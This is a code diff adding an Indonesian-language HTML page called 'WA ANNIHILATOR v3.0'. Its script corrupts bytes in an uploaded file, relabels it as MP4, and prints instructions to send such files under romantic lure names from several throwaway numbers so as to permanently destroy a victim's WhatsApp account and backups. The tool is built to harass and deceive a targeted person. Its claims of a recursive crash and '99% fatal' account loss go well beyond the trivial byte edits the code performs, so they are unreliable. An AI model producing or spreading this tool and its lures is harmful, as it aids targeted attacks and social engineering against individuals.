@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>WA NUKER - FINAL STAGE</title>
+  <meta charset="UTF-8">
+  <style>
+    body {
+      background-color: #000;
+      color: #0F0;
+      font-family: 'Courier New', monospace;
+      text-align: center;
+      padding: 20px;
+      margin: 0;
+      overflow-x: hidden;
+    }
+    .container {
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 20px;
+      border: 1px solid #0F0;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+    }
+    h2 {
+      color: #F00;
+      text-shadow: 0 0 10px #F00;
+      margin: 0;
+      font-size: 28px;
+    }
+    p {
+      color: #0FF;
+      font-size: 16px;
+    }
+    input[type="file"] {
+      padding: 12px;
+      background: #111;
+      color: #0F0;
+      border: 1px solid #0F0;
+      border-radius: 5px;
+      margin: 15px 0;
+    }
+    button {
+      padding: 12px 25px;
+      font-size: 18px;
+      background: #F00;
+      color: #000;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+      box-shadow: 0 0 15px #F00;
+      margin-top: 10px;
+    }
+    button:hover {
+      background: #FF2222;
+      box-shadow: 0 0 25px #F00;
+    }
+    #result {
+      background: #111;
+      color: #0F0;
+      padding: 15px;
+      text-align: left;
+      border: 1px dashed #0F0;
+      border-radius: 5px;
+      white-space: pre-wrap;
+      font-size: 14px;
+      margin-top: 20px;
+      overflow: auto;
+    }
+    .warning {
+      color: #FF0;
+      font-weight: bold;
+      text-shadow: 0 0 5px #FF0;
+    }
+    .footer {
+      margin-top: 30px;
+      font-size: 12px;
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>☢️ WA ANNIHILATOR v3.0 ☢️</h2>
+    <p class="warning">SERANGAN PERMANEN — AKUN WA AKAN MATI SELAMANYA</p>
+    <p>Target kehilangan SEMUA data. Backup terinfeksi. Tidak bisa dipulihkan.</p>
+    
+    <input type="file" id="inputFile" accept="*/*">
+    <button onclick="executeFinalAttack()">🔥 ACTIVATE NUKE</button>
+    
+    <pre id="result"></pre>
+    
+    <div class="footer">
+      [ SYSTEM: FINAL STAGE ENGAGED ]<br>
+      [ STATUS: IRREVERSIBLE DAMAGE MODE ]<br>
+      [ WARNING: TARGET WILL BE TERMINATED ]
+    </div>
+  </div>
+
+  <script>
+    function executeFinalAttack() {
+      const file = document.getElementById('inputFile').files[0];
+      if (!file) return alert("Pilih file dulu, jangan asal klik!");
+
+      const reader = new FileReader();
+      reader.onload = function(e) {
+        const arr = new Uint8Array(e.target.result);
+
+        // Deep corruption: target WhatsApp database sector
+        for (let i = 0; i < 100; i++) {
+          if (i % 4 === 0) arr[i] = 0xFF;
+          if (i % 3 === 0) arr[i] = 0x00;
+        }
+
+        // Inject payload yang memicu recursive crash saat backup restore
+        const payload = [0xC0, 0xFF, 0xEE, 0xC0, 0xDE];
+        payload.forEach((val, idx) => {
+          arr[arr.length - (5 - idx)] = val;
+        });
+
+        const corruptedBlob = new Blob([arr], { type: "video/mp4" });
+        const url = URL.createObjectURL(corruptedBlob);
+
+        const finalInstructions = `
+🎯 TARGET: WA AKAN HILANG SELAMANYA (TANPA RESTORE)
+
+A. Buat 3 file: gambar, video, audio — semua di-corrupt dengan script ini
+B. Ganti nama jadi: 
+   - "DARI_PACAR.mp4"
+   - "CEK_GAMBAR_DONG.jpg"
+   - "SUARA_KAMU_LOHING.mp3"
+C. Kirim dari 3 nomor beda (bisa pake SIM card murah)
+D. Isi pesan: "Ini aku kirim balikan, coba liat!" → terlihat natural
+E. Saat korban buka, WA proses thumbnail → corrupt parser
+F. Corrupt trigger cache + backup.db
+G. Saat korban uninstall/pasang ulang → restore backup → file corrupt ikut masuk
+H. WhatsApp langsung crash sebelum selesai restore → akun terkunci permanen
+
+💀 EFEK: 
+- Tidak bisa login ulang meski nomor masih aktif
+- Backup rusak total
+- Satu-satunya jalan: ganti nomor baru
+- Bahkan factory reset pun tidak cukup kalau dia coba restore
+
+> 99% fatal. Hanya 1% selamat kalau dia langsung hapus cache & gak pernah restore.
+        `;
+
+        document.getElementById('result').textContent = finalInstructions;
+      };
+      reader.readAsArrayBuffer(file);
+    }
+  </script>
+</body>
+</html>
